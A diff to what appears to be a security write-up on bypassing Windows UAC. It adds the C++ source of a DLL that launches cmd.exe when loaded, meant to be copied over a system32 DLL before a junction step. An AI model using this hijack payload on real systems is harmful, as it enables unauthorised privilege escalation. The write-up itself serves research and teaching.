@@ -171,6 +171,29 @@ BAM!  At this point, I have all that I need to:
 - Overwrite this file (I use copy /F myfile c:/windows/system32/destfile)
 - Execute the file and bypass UAC!  Teaser alert:  I copy a DLL that executes cmd.exe
 
+**here's the code for the DLL I'll be copying over the destination dll btw:**
+
+```cpp
+#include "pch.h"
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        WinExec("cmd.exe", 1);
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+```
+
 Let's continue shall we?  I'll go ahead and create the Junction, like so:
 
 ```cpp
